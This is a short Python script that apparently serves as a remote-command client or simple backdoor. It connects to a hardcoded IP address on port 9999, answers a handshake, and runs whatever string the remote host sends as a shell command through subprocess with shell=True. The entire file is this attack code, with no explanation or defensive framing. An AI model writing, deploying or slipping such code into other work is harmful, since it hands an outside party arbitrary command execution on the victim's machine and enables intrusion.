import socket
import os
import subprocess
host = "100.80.5.251"
port = 9999
s = socket.socket()
s.connect((host, port))
while True:
 data = str(s.recv(1024), "utf-8")
 if len(data) == 0:
    continue
 if data == "available?":
    s.send(str.encode("yes"))
    data = str(s.recv(1024), "utf-8")
    cmd = subprocess.Popen(data,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    print("performed...")
    break
